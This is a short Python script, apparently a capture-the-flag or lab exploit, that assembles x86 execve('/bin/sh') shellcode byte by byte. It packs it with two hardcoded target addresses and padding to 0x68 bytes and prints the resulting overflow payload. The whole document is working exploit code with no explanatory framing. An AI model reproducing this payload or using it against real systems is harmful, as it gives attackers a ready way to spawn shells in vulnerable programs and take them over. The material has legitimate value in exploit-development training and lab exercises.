import struct

# xor ecx, ecx
shell  = '\x31'
shell += '\xc9'
# mul ecx
shell += '\xf7'
shell += '\xe1'
# push ecx
shell += '\x51'
# push 0x68732f2f   ;; hs//
shell += '\x68'
shell += '\x2f\x2f\x73\x68'
# push 0x6e69622f   ;; nib/
shell += '\x68'
shell += '\x2f\x62\x69\x6e'
# mov ebx, esp
shell += '\x89'
shell += '\xe3'
# mov al, 11
shell += '\xb0'
shell += '\x0b'
shell += '\xcd'
# int 0x80
shell += '\x80'

addr1 = struct.pack("<I", 0x804a010) # 0x804eb78 on kali
pad = 'a' * (0x68 - len(shell))
addr2 = struct.pack("<I", 0x804a00c) # 0x804eb74 on kali
print(addr1 + shell + pad + addr2)
